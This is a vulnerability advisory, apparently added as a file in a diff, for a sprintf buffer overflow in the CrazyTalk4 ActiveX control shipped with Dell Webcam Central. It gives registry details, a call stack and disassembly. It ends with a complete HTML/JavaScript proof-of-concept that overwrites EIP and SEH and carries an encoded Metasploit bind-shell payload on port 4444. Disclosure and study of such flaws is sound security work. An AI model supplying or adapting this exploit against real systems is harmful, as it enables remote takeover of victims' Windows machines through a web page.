@@ -1,0 +1,143 @@
+Dell Webcam Software Bundled ActiveX Control CrazyTalk4Native.dll 
+sprintf Remote Buffer Overflow Vulnerability
+
+Tested against: Microsoft Windows Vista SP2
+                Microsoft Windows XP SP3
+                Microsoft Windows 2003 R2 SP2
+                Internet Explorer 7/8/9
+
+download url of a test version: 
+http://search.dell.com/results.aspx?c=us&l=en&s=gen&cat=sup&k=Dell+SX2210+monitor&rpp=12&p=1&subcat=dyd&rf=all&nk=f&sort=K&ira=False&~srd=False&ipsys=False&advsrch=False&~ck=anav
+
+file tested: Dell_SX2210-Monitor_Webcam SW RC1.1_ R230103.exe
+
+
+This package contains the Dell Webcam Central software
+developed by Creative Technologies for Dell.
+
+
+info: 
+http://dell-webcam-central.software.informer.com/
+http://live-cam-avatar-creator.software.informer.com/
+http://www.google.com/search?channel=s&hl=en&biw=1024&bih=581&q=13149882-F480-4F6B-8C6A-0764F75B99ED
+http://www.google.com/search?sclient=psy-ab&hl=en&biw=1024&bih=581&source=hp&q=crazytalk4.ocx&btnG=Search
+http://www.google.com/search?sclient=psy-ab&hl=en&biw=1024&bih=581&source=hp&q=CrazyTalk4Native.dll&btnG=Search
+http://dell-webcam-central.software.informer.com/users/
+http://live-cam-avatar-creator.software.informer.com/users/
+
+I think this is a very common ActiveX, probably bundled with Dell Notebooks.
+
+
+Background:
+The mentioned software carries a third party ActiveX Control
+with the following settings.
+
+Binary path: C:\Program Files\Common Files\Reallusion\CT Player\crazytalk4.ocx
+ProgID: CRAZYTALK4.CrazyTalk4Ctrl.1
+CLSID: {13149882-F480-4F6B-8C6A-0764F75B99ED}
+Safe for Scripting (Registry): True
+Safe for Initialization (Registry): True
+
+This control is marked safe for scripting and safe for initialization,
+then Internet Explorer will allow scripting of this control from remote.
+
+Vulnerability:
+
+The 'BackImage' ,'ScriptName', 'ModelName' and 'SRC' properties
+can be used to trigger a buffer overflow condition.
+The crazytalk4.ocx ActiveX control will load the close CrazyTalk4Native.dll
+library and, while constructing a local file path, will call sprintf()
+with an insufficient size.
+
+
+Call stack of main thread
+Address    Stack      Procedure / arguments                                                                                             Called from                   Frame
+0012EE24   023D4FAB   msvcrt.sprintf                                                                                                    CrazyTal.023D4FA5
+0012EE28   0012F180     s = 0012F180
+0012EE2C   023F431C     format = "%s%s%s"
+0012EE30   042A2D6C     <%s> = "C:\DOCUME~1\Admin\LOCALS~1\Temp\RLTMP\~RW463\"
+0012EE34   0012EF5C     <%s> = "aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa
+0012EE38   0012EE58     <%s> = ""
+0012F164   023D601D   CrazyTal.023D4F20     
+
+code, CrazyTalk4Native.dll :
+...
+023D4F80   85C0             test eax,eax
+023D4F82   74 38            je short CrazyTal.023D4FBC
+023D4F84   8B9C24 2C030000  mov ebx,dword ptr ss:[esp+32C]
+023D4F8B   8D4424 1C        lea eax,dword ptr ss:[esp+1C]
+023D4F8F   8D8C24 20010000  lea ecx,dword ptr ss:[esp+120]
+023D4F96   50               push eax
+023D4F97   81C6 443B0000    add esi,3B44
+023D4F9D   51               push ecx
+023D4F9E   56               push esi
+023D4F9F   68 1C433F02      push CrazyTal.023F431C                   ; ASCII "%s%s%s"
+023D4FA4   53               push ebx
+023D4FA5   FF15 E4F33E02    call dword ptr ds:[<&MSVCRT.sprintf>]    ; msvcrt.sprintf
+...
+
+As attachment, proof of concept code which overwrites EIP and SEH.
+
+
+Note:
+                                                                                       
+0:008> lm -vm CrazyTalk4Native
+start    end        module name
+021c0000 0220b000   CrazyTalk4Native   (deferred)             
+    Image path: C:\PROGRA~1\COMMON~1\REALLU~1\CTPLAY~1\CrazyTalk4Native.dll
+    Image name: CrazyTalk4Native.dll
+    Timestamp:        Thu May 17 12:13:42 2007 (464C2AD6)
+    CheckSum:         00048AB2
+    ImageSize:        0004B000
+    File version:     4.5.815.1
+    Product version:  4.0.0.1
+    File flags:       0 (Mask 3F)
+    File OS:          4 Unknown Win32
+    File type:        2.0 Dll
+    File date:        00000000.00000000
+    Translations:     0409.04b0
+    CompanyName:      C3D
+    ProductName:      CrazyTalk4 ActiveX Control Module
+    InternalName:     CrazyTalk4
+    OriginalFilename: CrazyTalk4.OCX
+    ProductVersion:   4, 0, 0, 1
+    FileVersion:      4, 5, 815, 1
+    PrivateBuild:     4, 5, 815, 1
+    SpecialBuild:     4, 5, 815, 1
+    FileDescription:  CrazyTalk4 Native Control Module
+    LegalCopyright:   Copyright (C) 2005
+    LegalTrademarks:  Copyright (C) 2005
+    Comments:         Copyright (C) 2005
+
+POC:
+<!-- 
+Dell Camera Software ActiveX Control CrazyTalk4Native.dll sprintf Remote Buffer Overflow Exploit
+bind shell, IE-NO-DEP
+
+Binary path: C:\Program Files\Common Files\Reallusion\CT Player\crazytalk4.ocx
+ProgID: CRAZYTALK4.CrazyTalk4Ctrl.1
+CLSID: {13149882-F480-4F6B-8C6A-0764F75B99ED}
+Safe for Scripting (Registry): True
+Safe for Initialization (Registry): True
+-->
+<!-- saved from url=(0014)about :internet -->
+<html>
+<object classid='clsid:13149882-F480-4F6B-8C6A-0764F75B99ED' id='obj' width=100; height=100; />
+</object>
+<script>
+//bad chars:
+//\x80,\x82-\x8c,\x8e,\x91-\x9c,\x9e-\x9f
+var x=""; 
+for (i=0; i<216; i++){x = x + "A";}
+x = x + "\x50\x24\x40\x77";//0x77402450      jmp EBP, user32.dll - change for your need
+for (i=0; i<140; i++){x = x + "A";}
+// windows/shell_bind_tcp - 696 bytes
+// http://www.metasploit.com
+// Encoder: x86/alpha_mixed
+// EXITFUNC=seh, LPORT=4444, RHOST=
+x = x + "‰åÚÐÙuô^VYIIIIIIIIIICCCCCC7QZjAXP0A0AkAAQ2AB2BB0BBABXP8ABuJIKLCZJKPMM8KIKOKOKOE0LKBLFDQ4LKG5GLLKCLC5CHC1JOLKPOB8LKQOGPC1JKQYLKFTLKC1JNP1IPJ9NLMTIPCDEWIQIZDMC1IRJKL4GKPTQ4FHCEKULKQOGTEQJKBFLKDLPKLKQOELC1JKESFLLKK9BLGTELE1HCFQIKE4LKPCP0LKQPDLLKD0ELNMLKQPC8QNE8LNPNDNJLPPKOHVE6PSCVE8P3FRE8D7CCGBQOQDKON0E8HKJMKLGKPPKOIFQOLIJEE6K1JMC8C2QEBJERKOHPE8N9DIKENMF7KOHVPSF3QCQCF3QSF3QSF3KON0E6E8B1QLE6F3K9M1J5BHNDDZBPIWQGKOIFCZDPPQQEKOHPBHI4NMFNM9QGKOHVQCQEKOHPBHM5QYK6QYPWKON6F0PTF4QEKON0LSE8M7CIHFD9PWKON6F5KON0CVBJCTBFCXE3BMMYM5CZF0QIGYHLK9M7CZPDMYKRP1IPL3NJKNG2FMKNG2FLLSLMCJFXNKNKNKCXBRKNH3DVKOD5G4KOHVQKQGF2F1PQPQBJEQPQPQQEPQKON0BHNMIIC5HNQCKOIFCZKOKOP7KON0LKF7KLMSHDE4KON6PRKON0BHJPMZDDQOPSKON6KOHPAA";
+try{
+    obj.BackImage = x;
+}catch(e){
+}
+</script>
